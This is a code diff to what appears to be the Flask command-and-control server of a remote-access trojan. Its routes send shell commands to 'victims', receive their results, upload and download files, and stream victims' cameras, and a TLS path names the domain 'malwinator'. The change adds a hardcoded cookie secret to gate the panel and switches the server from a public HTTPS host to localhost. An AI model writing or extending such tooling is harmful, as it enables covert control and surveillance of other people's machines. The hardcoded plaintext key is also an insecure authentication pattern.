@@ -29,9 +29,16 @@ def send_command(name, ip, command):
   
   return 1
 
+def check_login():
+  # key = 
+  pass
+  
+
 # interface routes
 @app.route('/')
 def displayHosts():
+  if request.cookies.get('superSecretKey') != 'c457r4v371':
+    return render_template('notLoggedIn.html')
   global hosts
   for host in hosts:
     # ping the hosts to see who's up
@@ -86,6 +93,8 @@ def timeout():
 # this is for the general interface where you can pick different tools to control one victim
 @app.route('/toolkit', methods = ['GET'])
 def show_toolkit():
+  if request.cookies.get('superSecretKey') != 'c457r4v371':
+    return render_template('notLoggedIn.html')
   global hosts
 
   name = request.args.get('name')
@@ -110,6 +119,8 @@ def shell():
   global hosts 
   
   if request.method == 'GET':
+    if request.cookies.get('superSecretKey') != 'c457r4v371':
+      return render_template('notLoggedIn.html')
     name = request.args.get('name')
     ip = request.args.get('ip')
 
@@ -127,6 +138,8 @@ def shell():
 # this is where the victim will send the command result
 @app.route('/result', methods = ['POST'])
 def result():
+  if request.cookies.get('superSecretKey') != 'c457r4v371':
+    return render_template('notLoggedIn.html')
   global hosts
   
   key = (request.remote_addr, request.form['name'])
@@ -169,6 +182,8 @@ def getLog():
   global hosts
 
   if request.method == 'GET':
+    if request.cookies.get('superSecretKey') != 'c457r4v371':
+      return render_template('notLoggedIn.html')
     name = request.args.get('name')
     ip = request.args.get('ip')
     
@@ -195,6 +210,8 @@ def download():
 # route to the file uploading interface
 @app.route('/upload', methods = ['GET'])
 def upload():
+  if request.cookies.get('superSecretKey') != 'c457r4v371':
+    return render_template('notLoggedIn.html')
   global hosts
   name = request.args.get('name')
   ip = request.args.get('ip')
@@ -220,17 +237,19 @@ def handle_stream(data):
 
 @app.route('/viewCamera', methods=['GET'])
 def view_camera():
+  if request.cookies.get('superSecretKey') != 'c457r4v371':
+    return render_template('notLoggedIn.html')
   return render_template('camera.html', name=request.args.get('name'), ip=request.args.get('ip')) 
 
 
 # https server
-if __name__ == '__main__':
-  socketio.run(ssl_context=('/etc/letsencrypt/live/malwinator.chickenkiller.com/fullchain.pem', '/etc/letsencrypt/live/malwinator.chickenkiller.com/privkey.pem'), debug=False, host='0.0.0.0', port='8082')
+# if __name__ == '__main__':
+#   socketio.run(ssl_context=('/etc/letsencrypt/live/malwinator.chickenkiller.com/fullchain.pem', '/etc/letsencrypt/live/malwinator.chickenkiller.com/privkey.pem'), debug=False, host='0.0.0.0', port='8082')
 
 # http server
 # if __name__ == "__main__":
 #   socketio.run(app, host='0.0.0.0', port='5000')
 
 # # localhost server
-# if __name__ == "__main__":
-#   socketio.run(host='127.0.0.1', port='8088')
+if __name__ == "__main__":
+  socketio.run(host='127.0.0.1', port='8088')
